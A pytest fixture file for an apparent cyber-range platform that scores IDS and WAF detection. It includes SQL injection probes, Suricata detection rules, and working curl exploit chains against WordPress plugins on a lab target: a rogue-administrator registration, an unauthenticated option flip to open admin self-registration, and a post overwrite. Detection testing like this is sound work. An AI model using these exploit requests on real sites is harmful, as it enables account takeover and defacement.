import json
import shlex
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from contextlib import contextmanager
from datetime import datetime, timedelta, timezone

import pytest
import requests

from conftest import (
    PLATFORM_URL, TARGET_PUBLIC, credited_to, from_attacker, run_redteam,
    runs_the_declared_rules, score_when_ready, seen_by_both_engines, target_code,
)
from range import ATTACKER, BOARD, missing, run, run_in_turn, run_side_by_side, start_hint

CONTROL = "board-sqli-search"
SECOND_SHAPE = "board-sqli-union-search"
UNION = "board-sqli-union-search"
BENIGN_SEARCH = "board-normal-search"
SQLMAP = "board-sqli-orderby-sqlmap"
LAST_ATTACK = "board-path-traversal-static"

NOISY_RULE = (
    '\nalert http any any -> any any (msg:"deliberate false positive"; '
    'http.uri; content:"release"; nocase; sid:9009999; rev:1;)\n'
)
BUFFERLESS = (
    'alert http any any -> any any (msg:"UNION without a buffer"; '
    'flow:established,to_server; content:"UNION"; nocase; sid:9009996; rev:1;)\n'
)
PORTED_RULE = 'alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"ported SQLi probe"; flow:established,to_server; http.uri; pcre:"/(\\x27[\\s+]*(or|and)[\\s+]*[\\x27\\d]|union[\\s+]+select|--[\\s+]|\\x27[\\s+]*--|\\x27[\\s+]*\\x29)/i"; sid:9009996; rev:1;)\n'
NOT_A_RULE = "this is not a rule"
CATCH_ALL = (
    'alert http any any -> any any (msg:"SQL XSS traversal Restricted File"; '
    'flow:established,to_server; http.uri; content:"/"; sid:9009997; rev:1;)\n'
)
CATCH_ALL_CASES = (
    "board-sqli-search", "board-xss-script-tag-in-search", "board-path-traversal-static",
    "board-normal-search", "board-normal-search-with-apostrophe",
)

DETECT_WITHOUT_BLOCKING_SEARCH = {
    "paranoia": 1,
    "exclusions": [{"rule_id": 949110, "target": "", "path": "/search/"}],
}
FABRICATED_LOOT = [{"username": "admin", "password": "admin1234"}]
TERMINAL_ATTACK = "/search/?q=%27%20OR%201%3D1--"
TERMINAL_BENIGN = "/search/?q=release"
TERMINAL_GAP_SECONDS = 6

CORP = "corp"
CORP_DB = "corp-db"
CORP_HOST = "Host: corp.com"
ROGUE_KEY = "wp_c%C3%A0pabilities%5Badministrator%5D=1"
NONCE_SLOT = "{nonce}"
REGISTER_NONCE = r'name="_wpnonce" value="\K[^"]+'
AJAX_NONCE = r'"ajaxSecurity":"\K[a-f0-9]+'
SUBMISSION_NONCE = r'rbGlobalSubmissionSettings = {"nonce":"\K[a-f0-9]+'
DEFACED = {
    "post_title": "Defaced by an unauthenticated guest",
    "post_excerpt": "overwritten without owning this post",
    "post_content": "overwritten without owning this post via rbsm_submit_post postId overwrite",
}
POST_FIELDS = ("post_title", "post_content", "post_excerpt", "post_status")
WINDOW_GAP_SECONDS = 7
SETTLE_SECONDS = 2


def open_session(**settings) -> int:
    created = requests.post(f"{PLATFORM_URL}/api/sessions/", json=settings, timeout=600)
    assert created.status_code == 201, created.text
    return created.json()["id"]


def close_session(session_id):
    return requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/close/", json={}, timeout=120
    )


@contextmanager
def shared_session(**settings):
    session_id = open_session(**settings)
    try:
        yield session_id
    finally:
        close_session(session_id)


def passed_to_the_ids(session_id):
    tuned = requests.put(
        f"{PLATFORM_URL}/api/sessions/{session_id}/waf/",
        json=DETECT_WITHOUT_BLOCKING_SEARCH, timeout=120,
    )
    assert tuned.ok, tuned.text
    for _ in range(30):
        reload_probe = f"/search/?q=%27%20OR%201%3D1--%20reload{uuid.uuid4().hex[:6]}"
        if target_code(reload_probe, session=session_id) != 403:
            return
        time.sleep(1)


def fire(session_id, case, origin=None, timeout=300):
    body = {"case": case} if origin is None else {"case": case, "origin": origin}
    return requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/attacks/", json=body, timeout=timeout,
    )


def fired_case_id(session_id, case, origin=None, timeout=300):
    sent = fire(session_id, case, origin, timeout)
    assert sent.status_code == 201, sent.text
    return sent.json()["case_id"]


def detections_of(session_id):
    return requests.get(
        f"{PLATFORM_URL}/api/sessions/{session_id}/detections/", timeout=120
    ).json()


def signatures(session_id):
    return {d["detection_id"]: d["signature"] for d in detections_of(session_id)}


def rules_of(session_id):
    return requests.get(
        f"{PLATFORM_URL}/api/rules/", params={"session": session_id}, timeout=60
    ).json()["content"]


def apply_rules(content, session_id):
    return requests.post(
        f"{PLATFORM_URL}/api/rules/apply/",
        json={"content": content, "session": session_id}, timeout=180,
    )


def auth_users_of(session_id):
    body = run(BOARD, [
        "python3", "-c",
        "import urllib.request,sys; "
        "sys.stdout.write(urllib.request.urlopen("
        "'http://127.0.0.1:8000/internal/auth-users', timeout=20).read().decode())",
    ], session=session_id).stdout
    return json.loads(body)


def alerts_mentioning(token, session, wait=90):
    deadline = time.time() + wait
    while True:
        requests.post(f"{PLATFORM_URL}/api/sessions/{session}/ingest/", timeout=120)
        found = [d for d in detections_of(session)
                 if d["source"] == "suricata" and token in (d.get("path") or "")]
        if found or time.time() >= deadline:
            return [dict(requests.get(f"{PLATFORM_URL}/api/detections/{d['id']}/", timeout=60).json()["raw"],
                         attributed=d["src_ip"]) for d in found]
        time.sleep(3)


def probed(session):
    token = f"zz{uuid.uuid4().hex[:10]}"
    from_attacker(f"/search/?q=%27%20OR%201%3D1--%20{token}", session=session)
    return alerts_mentioning(token, session)


def attack_from_the_shell(token, session):
    payload = f"/search/?q=%27%20OR%201%3D1--%20{token}"
    run(ATTACKER, ["sh", "-c", f'curl -s -o /dev/null --max-time 20 "http://board.com{payload}"'],
        session=session)
    return alerts_mentioning(token, session)


def typed(command, session_id):
    shell = f"printf '{command}\\nexit\\n' | bash -i"
    return run(ATTACKER, ["bash", "-c", shell], timeout=120, session=session_id)


@pytest.fixture(scope="session")
def full_run(stack_is_up):
    session_id = run_redteam()

    def ready(totals):
        if totals["tp"] <= 0:
            return False
        if "modsecurity" not in {d["source"] for d in detections_of(session_id)}:
            return False
        return bool(credited_to(session_id, totals, name=CONTROL)) and bool(
            credited_to(session_id, totals, name=LAST_ATTACK))

    score = score_when_ready(session_id, until=ready)
    seen = {"session_id": session_id, "score": score, "detections": detections_of(session_id)}
    seen["cases"] = requests.get(f"{PLATFORM_URL}/api/sessions/{session_id}/cases/", timeout=120).json()
    seen["topology"] = requests.get(
        f"{PLATFORM_URL}/api/sessions/{session_id}/topology/", timeout=120
    ).json()
    seen["scored_by"] = {
        strategy: requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/score/",
            params={"correlation": strategy}, timeout=120,
        ).json()
        for strategy in ("marker", "window")
    }
    return seen


@pytest.fixture(scope="session")
def score(full_run):
    return full_run["score"]


@pytest.fixture(scope="session")
def board_session(stack_is_up):
    with shared_session(wargame="board") as session_id:
        seen = {"session_id": session_id}
        seen["objectives_at_open"] = requests.post(
            f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=60
        )
        seen["score_while_open"] = requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60
        )
        seen["canary"] = requests.post(
            f"{PLATFORM_URL}/api/range/canary/", json={"session": session_id}, timeout=180
        )
        case_id = fired_case_id(session_id, CONTROL)
        seen["case_id"] = case_id
        loot = f"{PLATFORM_URL}/api/sessions/{session_id}/loot/"
        seen["fabricated_loot"] = requests.post(loot, json={"loot": FABRICATED_LOOT}, timeout=120)
        truth = auth_users_of(session_id)
        rows = [{"username": name, "hash": digest} for name, digest in truth.items()]
        seen["real_loot"] = requests.post(
            loot, json={"loot": rows, "case_id": case_id}, timeout=120
        )
        seen["closed"] = close_session(session_id)
        seen["score_once_closed"] = requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60
        ).json()

        def fired_case(totals):
            return next((c for c in totals["per_case"] if c["case_id"] == case_id), {})

        seen["scored"] = score_when_ready(
            session_id, until=lambda t: bool(fired_case(t).get("detection_ids"))
        )
        seen["own"] = fired_case(seen["scored"])
    return seen


def origins_of(session_id):
    listed = requests.get(
        f"{PLATFORM_URL}/api/origins/", params={"session": session_id}, timeout=120
    )
    assert listed.status_code == 200, listed.text
    return listed.json()["origins"]


@pytest.fixture(scope="session")
def origins_session(stack_is_up):
    with shared_session() as session_id:
        passed_to_the_ids(session_id)
        origins = origins_of(session_id)
        elsewhere = next((o for o in origins if not o["default"]), None)
        places = (("front", ""),) + ((("elsewhere", elsewhere["id"]),) if elsewhere else ())
        case_ids = {place: fired_case_id(session_id, CONTROL, origin) for place, origin in places}
        tool = fire(session_id, SQLMAP, "hk", timeout=900)
        refused = fire(session_id, SQLMAP, "dmz", timeout=120)
        close_session(session_id)

        def all_seen_by_both(totals):
            return all(
                seen_by_both_engines(session_id, totals, case_id=case_id)
                for case_id in case_ids.values()
            )

        score = score_when_ready(session_id, until=all_seen_by_both)
        return {
            "session_id": session_id,
            "origins": origins,
            "sources": {
                place: {
                    d["src_ip"] for d in credited_to(session_id, score, case_id=case_id)
                    if d["src_ip"]
                }
                for place, case_id in case_ids.items()
            },
            "tool": tool,
            "refused": refused,
        }


@pytest.fixture(scope="session")
def tuned_session(stack_is_up):
    with shared_session() as session_id:
        passed_to_the_ids(session_id)
        seen = {"session_id": session_id}
        seen["inside"] = next(zone["subnet"] for zone in requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/topology/", timeout=60
        ).json()["map"]["zones"] if zone["caption"] == "web")
        case_id = fired_case_id(session_id, CONTROL)
        second = fired_case_id(session_id, SECOND_SHAPE)
        close_session(session_id)

        score = score_when_ready(session_id, until=lambda totals: all(
            seen_by_both_engines(session_id, totals, case_id=one) for one in (case_id, second)))
        seen["score"] = score
        seen["own"] = {
            d["src_ip"] for d in credited_to(session_id, score, case_id=case_id) if d["src_ip"]
        }
        seen["map"] = requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/map/", timeout=120
        ).json()
        seen["listed"] = detections_of(session_id)
    return seen


@pytest.fixture(scope="session")
def rules_session(stack_is_up):
    with shared_session() as session_id:
        passed_to_the_ids(session_id)
        seen = {"session_id": session_id}
        baseline_rules = runs_the_declared_rules(session_id)
        seen["rules_before_invalid"] = rules_of(session_id)
        seen["invalid"] = apply_rules(NOT_A_RULE, session_id)
        seen["rules_after_invalid"] = rules_of(session_id)

        applied = apply_rules(BUFFERLESS, session_id)
        assert applied.ok, applied.text
        union = fired_case_id(session_id, UNION)

        def credited(totals):
            owned = next((c for c in totals["per_case"] if c["case_id"] == union), {})
            sigs = signatures(session_id)
            return any(sigs.get(d, "").startswith("UNION without a buffer")
                       for d in owned.get("detection_ids", []))

        seen["bufferless"] = (
            score_when_ready(session_id, until=credited), union, signatures(session_id)
        )

        seen["noisy"] = apply_rules(baseline_rules + PORTED_RULE + NOISY_RULE, session_id)
        assert seen["noisy"].ok, seen["noisy"].text
        fired = {name: fired_case_id(session_id, name) for name in (CONTROL, UNION, BENIGN_SEARCH)}
        seen["noisy_benign"] = fired[BENIGN_SEARCH]

        caught_all = apply_rules(CATCH_ALL, session_id)
        assert caught_all.ok, caught_all.text
        seen["catch_all"] = {fired_case_id(session_id, name) for name in CATCH_ALL_CASES}
        close_session(session_id)

        def ready(totals):
            verdicts = {case["case_id"]: case["verdict"] for case in totals["per_case"]}
            caught = [verdicts.get(case_id) for case_id in seen["catch_all"]]
            return verdicts.get(seen["noisy_benign"]) == "FP" and "TP" in caught and "FP" in caught

        seen["after"] = score_when_ready(session_id, until=ready)
        seen["listed"] = detections_of(session_id)
    return seen


@pytest.fixture(scope="session")
def terminal_session(stack_is_up):
    with shared_session() as session_id:
        passed_to_the_ids(session_id)
        seen = {"session_id": session_id}
        seen["box"] = dict(
            requests.get(
                f"{PLATFORM_URL}/api/attacker/", params={"session": session_id}, timeout=120
            ).json(),
            session=session_id,
        )
        seen["box_addresses"] = run(
            ATTACKER, ["sh", "-c", "hostname -I"], session=session_id
        ).stdout.split()
        seen["front"] = probed(session_id)

        marker = str(uuid.uuid4())
        label = f"{PLATFORM_URL}/api/attacker/label/"
        requests.post(label, json={"case_id": marker, "session": session_id}, timeout=60)
        try:
            typed("nmap --version", session_id)
        finally:
            requests.post(label, json={"case_id": None, "session": session_id}, timeout=60)
        typed("echo after", session_id)
        seen["marker"] = marker
        seen["commands"] = requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/commands/", timeout=120
        )

        seen["elsewhere"] = next(
            (o for o in origins_of(session_id) if not o["default"]), None)
        if seen["elsewhere"]:
            origin = f"{PLATFORM_URL}/api/attacker/origin/"
            token = f"zz{uuid.uuid4().hex[:8]}"
            try:
                requests.post(origin, json={"origin": seen["elsewhere"]["id"], "session": session_id},
                              timeout=60)
                seen["moved"] = (token, attack_from_the_shell(token, session_id))
            finally:
                requests.post(origin, json={"origin": "", "session": session_id}, timeout=60)
    return seen


def label_terminal(case_id, session_id):
    response = requests.post(
        f"{PLATFORM_URL}/api/attacker/label/",
        json={"case_id": case_id, "session": session_id}, timeout=30,
    )
    assert response.ok, response.text


def record_terminal_window(session_id, name, malicious, source_ip, started_at, ended_at, case_id=None):
    response = requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/cases/",
        json={
            "case_id": case_id or str(uuid.uuid4()),
            "name": name,
            "malicious": malicious,
            "correlation": "window",
            "source_ip": source_ip,
            "started_at": started_at.isoformat(),
            "ended_at": ended_at.isoformat(),
        },
        timeout=30,
    )
    assert response.status_code == 201, response.text


def scored_by(session_id, strategy):
    response = requests.get(
        f"{PLATFORM_URL}/api/sessions/{session_id}/score/", params={"correlation": strategy}, timeout=60,
    )
    assert response.ok, response.text
    return response.json()


def verdicts_of(totals):
    return {case["name"]: case["verdict"] for case in totals["per_case"]}


@pytest.fixture(scope="session")
def terminal_windows(stack_is_up):
    with shared_session() as session_id:
        passed_to_the_ids(session_id)
        attacker = requests.get(f"{PLATFORM_URL}/api/attacker/", params={"session": session_id}, timeout=60)
        assert attacker.ok, f"the attacker box is not available: {attacker.text}. Run `{start_hint()}`."
        source_ip = attacker.json()["source_ip"]

        time.sleep(TERMINAL_GAP_SECONDS)
        started = datetime.now(timezone.utc)
        from_attacker(TERMINAL_BENIGN, session=session_id)
        record_terminal_window(session_id, "terminal-benign", False, source_ip, started, datetime.now(timezone.utc))
        time.sleep(TERMINAL_GAP_SECONDS)

        started = datetime.now(timezone.utc)
        from_attacker(TERMINAL_ATTACK, session=session_id)
        record_terminal_window(session_id, "terminal-sqli", True, source_ip, started, datetime.now(timezone.utc))
        time.sleep(TERMINAL_GAP_SECONDS)

        labelled = str(uuid.uuid4())
        label_terminal(labelled, session_id)
        try:
            started = datetime.now(timezone.utc)
            from_attacker(TERMINAL_ATTACK, session=session_id)
            ended = datetime.now(timezone.utc)
        finally:
            label_terminal(None, session_id)
        record_terminal_window(session_id, "terminal-both-ways", True, source_ip, started, ended, labelled)

    def ready(totals):
        verdicts = verdicts_of(totals)
        return (verdicts.get("terminal-sqli") == verdicts.get("terminal-both-ways") == "TP"
                and seen_by_both_engines(session_id, totals, name="terminal-sqli"))

    seen = {"session_id": session_id, "score": score_when_ready(session_id, until=ready)}
    seen["sqli_seen_by_both"] = seen_by_both_engines(session_id, seen["score"], name="terminal-sqli")
    seen["by"] = {strategy: scored_by(session_id, strategy) for strategy in ("marker", "window")}
    seen["detections"] = detections_of(session_id)
    return seen


def wordpress_db(sql):
    return ["mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e", sql]


ADMINS = wordpress_db(
    "SELECT user_id FROM wp_usermeta WHERE meta_key='wp_capabilities' "
    "AND meta_value LIKE '%administrator%';"
)
FIRST_POST = wordpress_db(
    f"SELECT ID,{','.join(POST_FIELDS)} FROM wp_posts WHERE post_type='post' ORDER BY ID ASC LIMIT 1;"
)


def option_query(name):
    return wordpress_db(f"SELECT option_value FROM wp_options WHERE option_name='{name}';")


def option_update(name, value):
    return wordpress_db(f"UPDATE wp_options SET option_value='{value}' WHERE option_name='{name}';")


def post_query(post_id):
    return wordpress_db(f"SELECT {','.join(POST_FIELDS)} FROM wp_posts WHERE ID={post_id};")


def ids_in(out):
    return {int(x) for x in out.split()}


def first_post_in(out):
    post_id, *fields = out.rstrip("\n").split("\t", len(POST_FIELDS))
    return {"ID": post_id, **dict(zip(POST_FIELDS, fields))}


def post_in(out):
    return dict(zip(POST_FIELDS, out.rstrip("\n").split("\t", len(POST_FIELDS) - 1)))


def admin_ids(session=None):
    return ids_in(run(CORP_DB, ADMINS, session=session).stdout)


def post_row(post_id, session=None):
    return post_in(run(CORP_DB, post_query(post_id), session=session).stdout)


def with_nonce(page, pattern, *sent, session=None):
    fetched = shlex.join(["curl", "-s", "-H", CORP_HOST, "--max-time", "20", f"{TARGET_PUBLIC}{page}"])
    requests_sent = "; echo; ".join(
        shlex.join(argv).replace(NONCE_SLOT, "'\"$nonce\"'") for argv in sent
    )
    script = (
        f"nonce=$({fetched} | grep -oP {shlex.quote(pattern)} | head -n 1); "
        f"printf '%s\\n' \"$nonce\"; [ -n \"$nonce\" ] || exit 0; {requests_sent}"
    )
    nonce, _, said = run(ATTACKER, ["sh", "-c", script], session=session).stdout.partition("\n")
    return nonce.strip(), said.strip()


def registration(login):
    return [
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20",
        "-H", CORP_HOST,
        "--data", "form_id=5",
        "--data", "um_request=",
        "--data", f"_wpnonce={NONCE_SLOT}",
        "--data", "_wp_http_referer=/register/",
        "--data", f"user_login-5={login}",
        "--data", "first_name-5=North",
        "--data", "last_name-5=Wind",
        "--data", f"user_email-5={login}@example.com",
        "--data", "user_password-5=Str0ng-Pass-9271",
        "--data", "confirm_user_password-5=Str0ng-Pass-9271",
        "--data", ROGUE_KEY,
        f"{TARGET_PUBLIC}/register/",
    ]


def option_flip(name, value):
    return [
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20",
        "-H", CORP_HOST,
        "--data", f'data={{"type":"save_setting","append":false,"option":"{name}","value":"{value}"}}',
        f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php?action=wpgdprc_process_action&security={NONCE_SLOT}",
    ]


def post_overwrite(post_id):
    return [
        "curl", "-s", "--max-time", "20",
        "-H", CORP_HOST,
        "--data-urlencode", "action=rbsm_submit_post",
        "--data-urlencode", f"_nonce={NONCE_SLOT}",
        "--data-urlencode", "formId=1",
        "--data-urlencode", f"postId={post_id}",
        "--data-urlencode", f"title={DEFACED['post_title']}",
        "--data-urlencode", f"excerpt={DEFACED['post_excerpt']}",
        "--data-urlencode", f"content={DEFACED['post_content']}",
        "--data-urlencode", "userName=Anonymous Contributor",
        "--data-urlencode", "userEmail=anon@example.com",
        f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php",
    ]


def site_restored(created, original):
    return {
        **{f"user {uid}": ["wp", "--allow-root", "user", "delete", str(uid), "--yes", "--network"]
           for uid in sorted(created)},
        "post": [
            "wp", "--allow-root", "post", "update", original["ID"],
            f"--post_title={original['post_title']}",
            f"--post_excerpt={original['post_excerpt']}",
            f"--post_status={original['post_status']}",
        ],
        **{meta: ["wp", "--allow-root", "post", "meta", "delete", original["ID"], meta]
           for meta in ("rbsm_form_id", "rbsm_author_info")},
    }


def content_restored(original):
    quoted = "'" + original["post_content"].replace("'", "\\'") + "'"
    return wordpress_db(f"UPDATE wp_posts SET post_content={quoted} WHERE ID={original['ID']}")


def corp_is_declared():
    absent = missing(CORP, CORP_DB)
    assert not absent, (
        f"the corp wargame is not on this range: "
        f"{', '.join(absent)} {'has' if len(absent) == 1 else 'have'} no host "
        f"in platform/range/declaration.yaml for it, so nothing builds or boots "
        f"the target and the live exploit has nothing to change"
    )


def finished(*calls):
    with ThreadPoolExecutor(max_workers=len(calls)) as pool:
        return [pool.submit(call) for call in calls]


def settled(since, seconds):
    time.sleep(max(0.0, since + seconds - time.monotonic()))


def record_corp_window(session_id, name, fired_at, done_at):
    recorded = requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/cases/",
        json={
            "case_id": f"{name}-{uuid.uuid4().hex[:8]}",
            "name": name,
            "malicious": True,
            "correlation": "marker",
            "started_at": (fired_at - timedelta(seconds=3)).isoformat(),
            "ended_at": (done_at + timedelta(seconds=3)).isoformat(),
        },
        timeout=60,
    )
    assert recorded.status_code == 201, recorded.text


def judged_corp(session_id):
    observed = requests.post(f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=120).json()
    credited, score = finished(
        lambda: requests.get(f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=60).json(),
        lambda: requests.get(f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60).json(),
    )
    return {
        "observed": observed,
        "credited": {o["key"] for o in credited.result()},
        "score": score.result(),
    }


def rogue_admin_run():
    with shared_session(wargame="corp") as session_id:
        opened = time.monotonic()
        before = run_side_by_side(CORP_DB, {"admins": ADMINS, "post": FIRST_POST}, session=session_id)
        baseline, original = ids_in(before["admins"].stdout), first_post_in(before["post"].stdout)
        seen = {"session_id": session_id, "baseline": baseline, "created": set(), "original": original}
        try:
            settled(opened, SETTLE_SECONDS)
            fired_at = datetime.now(timezone.utc)
            nonce, seen["code"] = with_nonce(
                "/register/", REGISTER_NONCE, registration(f"rogue_{uuid.uuid4().hex[:8]}"),
                session=session_id,
            )
            done_at = datetime.now(timezone.utc)
            gap_from = time.monotonic()
            assert nonce, "no _wpnonce on the live UM register form; is corp-wp up?"
            admins, recorded = finished(
                lambda: admin_ids(session_id),
                lambda: record_corp_window(session_id, "corp-rogue-admin", fired_at, done_at),
            )
            seen["admins"] = admins.result()
            seen["created"] = seen["admins"] - baseline
            recorded.result()
            settled(gap_from, WINDOW_GAP_SECONDS)
            fired_at = datetime.now(timezone.utc)
            nonce, seen["overwrite"] = with_nonce(
                "/submit-a-story/", SUBMISSION_NONCE, post_overwrite(original["ID"]), session=session_id,
            )
            done_at = datetime.now(timezone.utc)
            assert nonce, "no rbGlobalSubmissionSettings nonce on the live corp.com submission page; is corp-wp up?"
            overwritten, recorded = finished(
                lambda: post_row(original["ID"], session_id),
                lambda: record_corp_window(session_id, "corp-content-write", fired_at, done_at),
            )
            seen["overwritten"] = overwritten.result()
            recorded.result()
            seen.update(judged_corp(session_id))
        finally:
            run_in_turn(CORP, site_restored(seen["created"], original), timeout=180, session=session_id)
            after = run_in_turn(CORP_DB, {
                "content": content_restored(original),
                "admins": ADMINS,
                "post": post_query(original["ID"]),
            }, session=session_id)
            seen["admins_left"] = ids_in(after["admins"].stdout)
            seen["restored"] = post_in(after["post"].stdout)
    return seen


def option_flip_run():
    with shared_session(wargame="corp") as session_id:
        opened = time.monotonic()
        seen = {"session_id": session_id}
        try:
            settled(opened, SETTLE_SECONDS)
            fired_at = datetime.now(timezone.utc)
            nonce, said = with_nonce(
                "/", AJAX_NONCE,
                option_flip("users_can_register", "1"), option_flip("default_role", "administrator"),
                session=session_id,
            )
            done_at = datetime.now(timezone.utc)
            assert nonce, "no wpgdprcData.ajaxSecurity on the live corp.com homepage; is corp-wp up?"
            seen["flips"] = tuple(said.split())
            options, recorded = finished(
                lambda: run_side_by_side(CORP_DB, {
                    name: option_query(name) for name in ("users_can_register", "default_role")
                }, session=session_id),
                lambda: record_corp_window(session_id, "corp-self-registration", fired_at, done_at),
            )
            read = options.result()
            seen["registration_open"] = read["users_can_register"].stdout.strip()
            seen["default_role"] = read["default_role"].stdout.strip()
            recorded.result()
            seen.update(judged_corp(session_id))
        finally:
            left = run_in_turn(CORP_DB, {
                "closed": option_update("users_can_register", "0"),
                "subscriber": option_update("default_role", "subscriber"),
                "users_can_register": option_query("users_can_register"),
                "default_role": option_query("default_role"),
            }, session=session_id)
            seen["options_left"] = (
                left["users_can_register"].stdout.strip(), left["default_role"].stdout.strip()
            )
    return seen


@pytest.fixture(scope="session")
def corp_sessions(stack_is_up):
    corp_is_declared()
    rogue_admin, option_flip_seen = finished(rogue_admin_run, option_flip_run)
    return {"rogue_admin": rogue_admin.result(), "option_flip": option_flip_seen.result()}


@pytest.fixture(scope="session")
def rogue_admin_session(corp_sessions):
    return corp_sessions["rogue_admin"]


@pytest.fixture(scope="session")
def option_flip_session(corp_sessions):
    return corp_sessions["option_flip"]
